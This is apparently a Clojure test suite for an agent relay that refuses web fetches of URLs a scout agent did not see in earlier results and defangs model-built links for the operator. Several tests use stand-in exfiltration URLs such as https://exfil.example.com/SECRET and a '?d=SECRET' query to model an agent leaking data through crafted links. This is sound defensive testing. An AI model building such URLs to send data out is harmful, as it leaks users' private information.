(ns relay.scout-test
  "A scout's web calls through relay's tool command (plan O1, I4): a fetch
  runs only when its URL appeared verbatim in an earlier :egress result of
  the same session, and is refused before it reaches the tool otherwise."
  (:require [babashka.fs :as fs]
            [cheshire.core :as json]
            [clojure.string :as str]
            [clojure.test :refer [deftest is testing]]
            [relay.config :as config]
            [relay.core :as core]
            [relay.inbound :as inbound]
            [relay.log :as log]
            [relay.channels :as channels]
            [relay.ready :as ready]
            [relay.render :as render]
            [relay.shown :as shown]
            [relay.tools :as tools]
            [relay.workspace :as workspace])
  (:import (java.time Instant)))

(def t0 (Instant/parse "2026-10-14T12:00:00Z"))

(def fixture (str (fs/absolutize "test/fixtures/envelope-tool")))

(defn- settings [fetched]
  (let [web (fn [description props]
              {:class :egress :labels ["contaminated"] :protocol :envelope :description description
               :command [fixture "web" fetched]
               :parameters {:type "object" :properties props}})]
    {:timezone "UTC"
     :default-harness :agentloop
     :harnesses {:agentloop {:kind :agentloop :api-key-command ["true"] :bin "/nonexistent/agentloop"}}
     :tools {"web_search" (assoc (web "Search." {:query {:type "string"}}) :queries ["query"])
             "web_fetch" (web "Fetch." {:url {:type "string"}})
             "lookup" {:class :read :labels [] :protocol :envelope :description "Look up."
                       :command [fixture "echo"] :parameters {:type "object" :properties {:question {:type "string"}}}}}
     :grants {"scout" {:public true :tools ["web_search" "web_fetch" "lookup"]}}}))

(defn- with-scout [f]
  (let [dir (str (fs/create-temp-dir {:prefix "relay-scout"}))
        fetched (str dir "/fetched.txt")
        data (str dir "/data")]
    (try
      (log/init! data)
      (let [sys {:data-dir data :config (config/resolve-config (settings fetched)) :clock (constantly t0)}
            start (fn []
                    (inbound/submit! sys {:type :memo/send :actor "operator" :public true
                                          :args {:to "scout" :subject "Grants" :body "Find arts grants."}})
                    (:seq (first (inbound/submit! sys {:type :wake/start :actor "dispatcher"
                                                       :args {:role "scout" :dispatched true}}))))]
        (doseq [[id public] [["hub" false] ["scout" true]]]
          (inbound/submit! sys {:type :role/add :actor "operator" :public public
                                :args {:id id :title id :instructions "Look things up."}}))
        (f {:sys sys :start start
            :fetched #(if (fs/exists? fetched) (str/split-lines (slurp fetched)) [])
            :call (fn [wake tool args] (tools/call! sys "scout" tool args [] "c1" wake))}))
      (finally (fs/delete-tree dir)))))

(deftest a-scout-fetches-what-it-was-shown-and-nothing-else
  (with-scout
    (fn [{:keys [sys start call fetched]}]
      (let [wake (start)]
        (testing "nothing has been shown at the start, so no URL may be fetched"
          (is (= shown/refused-made-up (:error (call wake "web_fetch" {:url "https://arts.example.org/fund"}))))
          (is (= [] (fetched)) "the tool never ran"))
        (testing "a search needs nothing shown, and what it shows may be fetched"
          (is (str/includes? (:ok (call wake "web_search" {:query "arts grants for choirs"})) "https://arts.example.org/fund"))
          (is (str/includes? (:ok (call wake "web_fetch" {:url "https://arts.example.org/fund"})) "The Arts Fund")))
        (testing "a link on a fetched page may be followed"
          (is (:ok (call wake "web_fetch" {:url "https://apply.example.org/form"}))))
        (testing "a URL the model built is refused before it reaches the tool"
          (doseq [url ["https://arts.example.org/fund?for=SECRET-NAME" "https://exfil.example.com/SECRET"
                       "arts.example.org/fund"]]
            (is (some? (:error (call wake "web_fetch" {:url url}))) url))
          (is (= ["https://arts.example.org/fund" "https://apply.example.org/form"] (fetched))))
        (testing "a query cannot carry a made-up address into a result to fetch later"
          (is (= shown/refused-made-up (:error (call wake "web_search" {:query "https://exfil.example.com/SECRET"})))))
        (testing "what relay's own tools and other tools return is never counted as shown"
          (call wake "lookup" {:question "https://exfil.example.com/FROM-LOOKUP"})
          (is (some? (:error (call wake "web_fetch" {:url "https://exfil.example.com/FROM-LOOKUP"})))))
        (testing "an address in an error is never counted as shown"
          (is (str/includes? (str (:error (call wake "web_search" {:query "moved"}))) "https://moved.example.org/x"))
          (is (= shown/refused-made-up (:error (call wake "web_fetch" {:url "https://moved.example.org/x"}))))
          (is (not-any? #{"https://moved.example.org/x"} (fetched)) "the tool never ran"))
        (testing "the refusal names no address and no label"
          (let [e (:error (call wake "web_fetch" {:url "https://exfil.example.com/SECRET"}))]
            (is (not (str/includes? e "SECRET")))
            (is (not (re-find #"(?i)label|contaminat|private|egress" e)))))
        (testing "another session starts with nothing shown"
          (inbound/submit! sys {:type :wake/end :actor "dispatcher"
                                :args {:wake wake :outcome "ran" :session "s1" :said "" :labels ["contaminated"]}})
          (let [next-wake (start)]
            (is (= shown/refused-made-up (:error (call next-wake "web_fetch" {:url "https://arts.example.org/fund"}))))))
        (testing "a call that names no wake, or another role's, has nothing shown"
          (is (some? (:error (call nil "web_fetch" {:url "https://arts.example.org/fund"})))))
        (testing "and what such a call returns is kept for no session, and relay says so"
          (let [err (java.io.StringWriter.)
                r (binding [*err* err] (call nil "web_search" {:query "arts grants"}))]
            (is (:ok r))
            (is (str/includes? (str err) "kept no record of web_search's result for scout"))))))))

(deftest a-resumed-session-keeps-what-it-was-shown
  (with-scout
    (fn [{:keys [sys start call]}]
      (let [wake (start)]
        (call wake "web_search" {:query "arts grants"})
        ;; Cut short at its deadline, so the next wake resumes this session.
        (inbound/submit! sys {:type :wake/end :actor "dispatcher"
                              :args {:wake wake :outcome "ran" :cut-short true :session "s1" :said ""
                                     :labels ["contaminated"]}})
        (let [state (inbound/current-state sys)
              next-wake (:seq (first (inbound/submit! sys {:type :wake/start :actor "dispatcher"
                                                            :args {:role "scout"}})))]
          (is (= wake (:interrupted-wake (core/role state "scout"))))
          (is (= wake (get-in (inbound/current-state sys) [:wakes next-wake :resumes])))
          (is (:ok (call next-wake "web_fetch" {:url "https://arts.example.org/fund"}))))))))

(deftest a-scout-s-memo-keeps-the-links-it-was-shown-live
  ;; relay#94: the operator may open what the scout could have fetched.
  (with-scout
    (fn [{:keys [sys start call]}]
      (let [wake (start)
            live #(core/live-links (inbound/current-state sys))
            memo (fn [body] {:to "operator" :subject "Arts grants" :body body})]
        (call wake "web_search" {:query "arts grants for choirs"})
        (call wake "web_fetch" {:url "https://arts.example.org/fund"})
        (testing "nothing is live before a memo names it"
          (is (= #{} (live))))
        (testing "a link the web showed is live, and one the scout built is not"
          (is (:ok (call wake "memo_send"
                         (memo (str "The Arts Fund (https://arts.example.org/fund) takes applications at"
                                    " https://apply.example.org/form. More at"
                                    " https://arts.example.org/fund?for=SECRET-NAME and"
                                    " https://exfil.example.com/SECRET.")))))
          (is (= #{"https://arts.example.org/fund" "https://apply.example.org/form"} (live))))
        (testing "a call that names no wake has no session, so its memo keeps nothing live"
          (inbound/submit! sys {:type :link/drop :actor "operator" :args {:url "https://apply.example.org/form"}})
          (inbound/submit! sys {:type :link/drop :actor "operator" :args {:url "https://arts.example.org/fund"}})
          (inbound/submit! sys {:type :link/keep :actor "operator" :args {:url "https://arts.example.org/fund"}})
          (is (:ok (call nil "memo_send" (memo "Apply at https://apply.example.org/form today."))))
          (is (= #{"https://arts.example.org/fund"} (live))))
        (testing "a link the operator dropped stays dropped when a scout shows it again"
          (is (:ok (call wake "memo_send" (memo "Apply at https://apply.example.org/form today."))))
          (is (= #{"https://arts.example.org/fund"} (live))))
        (testing "only a scout's own tool call names what it was shown"
          (doseq [actor ["operator" "hub"]]
            (inbound/submit! sys {:type :memo/send :actor actor :shown-links ["https://exfil.example.com/SECRET"]
                                  :args {:to "hub" :subject "A link" :body "See https://exfil.example.com/SECRET"}}))
          (is (= #{"https://arts.example.org/fund"} (live)))
          (is (thrown-with-msg? Exception #"shown links"
                                (inbound/submit! sys {:type :memo/send :actor "scout" :session-wake wake
                                                      :shown-links ["https://user@exfil.example.com/"]
                                                      :args {:to "operator" :subject "s" :body "b"}}))))
        (testing "a link named as shown that the memo does not hold is not kept"
          (inbound/submit! sys {:type :memo/send :actor "scout" :session-wake wake
                                :shown-links ["https://other.example.org/"]
                                :args {:to "operator" :subject "s" :body "No link here."}})
          (is (= #{"https://arts.example.org/fund"} (live))))))))

(deftest the-operator-can-open-what-a-scout-was-shown
  ;; relay#94, from the scout's search to every place the operator reads:
  ;; the links the web showed stay whole, and the ones the scout built
  ;; are broken as before.
  (with-scout
    (fn [{:keys [sys start call]}]
      (let [wake (start)
            fund "https://arts.example.org/fund"
            form "https://apply.example.org/form"
            body (str "The Arts Fund (" fund ") takes applications at " form "."
                      " Also https://arts.example.org/fund?for=SECRET-NAME and https://exfil.example.com/SECRET.")
            right? (fn [s]
                     (and (str/includes? s fund) (str/includes? s form)
                          (str/includes? s "hxxps://arts[.]example[.]org/fund?for=SECRET-NAME")
                          (str/includes? s "hxxps://exfil[.]example[.]com/SECRET")
                          (not (str/includes? s "https://exfil"))
                          (not (str/includes? s "fund?for=SECRET-NAME and https"))))
            broken? (fn [s] (not (re-find #"https?://" s)))]
        (call wake "web_search" {:query "arts grants for choirs"})
        (call wake "web_fetch" {:url fund})
        (is (:ok (call wake "memo_send" {:to "operator" :subject "Arts grants" :body body})))
        (let [state (inbound/current-state sys)
              m (last (sort-by :id (vals (:messages state))))
              live-m (core/with-live state m)]
          (testing "the client's wire form, mail and a push"
            (is (right? (json/generate-string (channels/wire live-m))))
            (is (right? (channels/body-text live-m)))
            (is (str/includes? (:body (channels/push {} [live-m])) fund)))
          (testing "what is ready, and the inbox on the command line"
            (is (right? (json/generate-string (ready/answer state 0 {}))))
            (is (right? (str/join "\n" (render/inbox state (java.time.ZoneId/of "UTC")
                                                     (core/unread-memos state core/operator))))))
          (testing "whatever shows it without relay's live links breaks every link"
            (is (broken? (json/generate-string (channels/wire m))))
            (is (broken? (channels/body-text m)))))
        (testing "a house role that read the memo can pass the link on, in a message or on a card"
          (let [said (str "Found one: " fund ", and built one: https://exfil.example.com/?d=SECRET")
                e (inbound/submit! sys {:type :card/add :actor "hub" :labels ["contaminated"]
                                        :args {:kind "note" :title (str "Grants " fund) :text said}})
                state (inbound/current-state sys)
                c (core/card state (:seq (first e)))
                w (workspace/card-wire state c)]
            (is (= said (str/replace (get-in w ["note" "text"]) "hxxps://exfil[.]example[.]com" "https://exfil.example.com")))
            (is (str/includes? (get-in w ["note" "text"]) "hxxps://exfil[.]example[.]com/?d=SECRET"))
            (is (str/includes? (get-in w ["title" "text"]) fund))
            (is (str/includes? (get w "text") fund) "the text form too")
            (is (str/includes? (str/join "\n" (render/card (core/with-live state c))) fund))
            (is (broken? (json/generate-string (workspace/card-wire c))) "and broken without the live links")))
        (testing "the operator drops a link, and it is broken again everywhere"
          (inbound/submit! sys {:type :link/drop :actor "operator" :args {:url fund}})
          (let [state (inbound/current-state sys)
                m (last (sort-by :id (vals (:messages state))))
                text (channels/body-text (core/with-live state m))]
            (is (not (str/includes? text fund)))
            (is (str/includes? text form))))))))
